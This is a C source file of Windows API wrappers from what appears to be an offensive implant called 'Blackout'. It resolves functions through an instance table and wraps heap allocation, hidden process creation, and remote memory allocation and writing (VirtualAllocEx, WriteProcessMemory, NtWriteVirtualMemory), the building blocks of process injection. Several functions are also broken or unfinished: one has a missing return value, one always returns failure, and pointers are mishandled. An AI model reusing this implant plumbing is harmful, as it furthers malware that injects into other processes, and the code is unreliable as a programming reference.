#include <Utils.h>
#include <Common.h>

/*=================================[ Heap bkAPIs ]=================================*/

FUNC PVOID bkHeapAlloc(
    _In_ UINT64 Size
) {
    BLACKOUT_INSTANCE

    PVOID VmHeap = Instance()->Win32.RtlAllocateHeap( Instance()->Session.Heap, HEAP_ZERO_MEMORY, Size );

    return VmHeap;
}

FUNC PVOID bkHeapReAlloc(
    _In_ PVOID  Addr,
    _In_ UINT64 Size
) {
    BLACKOUT_INSTANCE

    PVOID VmHeap = Instance()->Win32.RtlReAllocateHeap( Instance()->Session.Heap, HEAP_ZERO_MEMORY, Addr, Size );

    return VmHeap;
}

FUNC BOOL bkHeapFree(
    _In_ PVOID  Data,
    _In_ UINT64 Size
) {
    BLACKOUT_INSTANCE

    MmZero( Data, Size );
    BOOL bSuc = Instance()->Win32.RtlFreeHeap( Instance()->Session.Heap, NULL, Data );
    Data = NULL;

    return bSuc;
}

/*=================================[ Process bkAPIs ]=================================*/

FUNC HANDLE bkOpenProcess(
    _In_ DWORD DesiredAccess,
    _In_ BOOL  InheritHandle,
    _In_ DWORD ProcessId
) {
    BLACKOUT_INSTANCE

    HANDLE hProcess = NULL;
#ifdef BK_WINAPI
    hProcess = Instance()->Win32.OpenProcess( DesiredAccess, InheritHandle, ProcessId );
#elif BK_NTAPI
/*
    NTSTATUS  Status = 0;
    CLIENT_ID ClientId = { 0 };
    OBJECT_ATTRIBUTES ProcAttr = RTL_CONSTANT_OBJECT_ATTRIBUTES( NULL, 0 );

    MmZero( ClientId, sizeof( CLIENT_ID ) );
    
    ClientId.UniqueProcess = ProcessId;
    
    Status = Instance()->Win32.NtOpenProcess( &hProcess, DesiredAccess, &ProcAttr, &ClientId );
    if ( Status != STATUS_SUCCESS )
        return INVALID_HANDLE_VALUE;
*/
#endif
    return hProcess;
}

FUNC BOOL bkTerminateProcess( 
    _In_ HANDLE hProcess,
    _In_ UINT32 ExitStatus
) {
    BLACKOUT_INSTANCE

    BOOL bCheck = FALSE;
#ifdef BK_WINAPI
    bCheck = Instance()->Win32.TerminateProcess( hProcess, ExitStatus );
#elif BK_NTAPI
    bCheck = Instance()->Win32.NtTerminateProcess( hProcess, ExitStatus );
#endif
    return bCheck;
}

FUNC BOOL bkCreateProcess(
    _In_ PSTR ProcCmd,
    _In_ BOOL InheritHandle,
    _In_opt_  DWORD   Flags,
    _Out_opt_ HANDLE *ProcessHandle,
    _Out_opt_ DWORD  *ProcessId,
    _Out_opt_ HANDLE *ThreadHandle,
    _Out_opt_ DWORD  *ThreadId
) {
    BLACKOUT_INSTANCE

    BOOL bCheck = FALSE;

    PROCESS_INFORMATION Pi = { 0 };
    STARTUPINFOA        Si = { 0 };

    MmZero( &Pi, sizeof( PROCESS_INFORMATION ) );
    MmZero( &Si, sizeof( STARTUPINFOA ) );

    Si.cb = sizeof( STARTUPINFOA );
    Si.wShowWindow = SW_HIDE;

    bCheck = Instance()->Win32.CreateProcessA( NULL, ProcCmd, NULL, NULL, InheritHandle, Flags, NULL, NULL, &Si, &Pi );
    if ( !bCheck )
        return bCheck;

    *ProcessId     = Pi.dwProcessId;
    *ProcessHandle = Pi.hProcess;
    *ThreadId      = Pi.dwThreadId;
    *ThreadHandle  = Pi.hThread;

    return bCheck;    
}

/*=================================[ Memory bkAPIs ]=================================*/

FUNC DWORD bkMemAlloc(
    _In_opt_    HANDLE  hProcess,
    _Inout_opt_ PVOID  *BaseAddr,
    _In_        UINT64  RegionSize,
    _In_        DWORD   AllocationType,
    _In_        DWORD   Protection
) {
    BLACKOUT_INSTANCE

    DWORD Err = 0;

#ifdef BK_WINAPI
    if ( hProcess ) {
       *BaseAddr = Instance()->Win32.VirtualAllocEx( hProcess, *BaseAddr, RegionSize, AllocationType, Protection );
    } else {
        *BaseAddr = Instance()->Win32.VirtualAlloc( NULL, RegionSize, AllocationType, Protection );
    }

    Err = NtGetLastError();
#elif BK_NTAPI
    NTSTATUS Status = 0;

    PVOID  MemAllocated = NULL;
    Status = Instance()->Win32.NtAllocateVirtualMemory( hProcess, &MemAllocated, 0, &RegionSize, AllocationType, Protection );

    *BaseAddr = MemAllocated;

    Err = Status;
#endif

    return Err;
}

FUNC DWORD bkMemWrite(
    _In_ HANDLE ProcessHandle,
    _In_ PBYTE  MemBaseAddr,
    _In_ PBYTE  Buffer,
    _In_ DWORD  BufferSize
) {
    BLACKOUT_INSTANCE

    DWORD  Err = 0;
    UINT64 BytesWritten = 0;

#ifdef BK_WINAPI
    if ( ProcessHandle ) {
        Instance()->Win32.WriteProcessMemory( ProcessHandle, MemBaseAddr, Buffer, BufferSize, &BytesWritten );
    }
    else {
        MmCopy( MemBaseAddr, Buffer, BufferSize );
    }

    Err = NtLastError();
#elif BK_NTAPI
    Err = Instance()->Win32.NtWriteVirtualMemory( ProcessHandle, MemBaseAddr, &Buffer, BufferSize, &BytesWritten );
#endif

    return Err;
}

/*=================================[ Thread bkAPIs ]=================================*/


/*=================================[ Miscellaneous bkAPIs ]=================================*/

FUNC BOOL bkCloseHandle(
    _In_ HANDLE hObject
) {
    BLACKOUT_INSTANCE

    BOOL bCheck = FALSE;
#ifdef BK_WINAPI
    Instance()->Win32.CloseHandle( hObject );
#elif BK_NTAPI
    Instance()->Win32.NtClose( hObject );
#endif

    return bCheck;
}

FUNC DWORD bkReadFile( 
    void
) {
    BLACKOUT_INSTANCE

    //Instance()->Win32.ReadFile( hFile,  )

} 

FUNC DWORD bkCreatePipe(
    _Out_ PHANDLE hStdPipeRead,
    _Out_ PHANDLE hStdPipeWrite
) {
    BLACKOUT_INSTANCE

    SECURITY_ATTRIBUTES SecurityAttr = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };
    Instance()->Win32.CreatePipe( &hStdPipeRead, &hStdPipeWrite, &SecurityAttr, 0 );

    return NtLastError();
}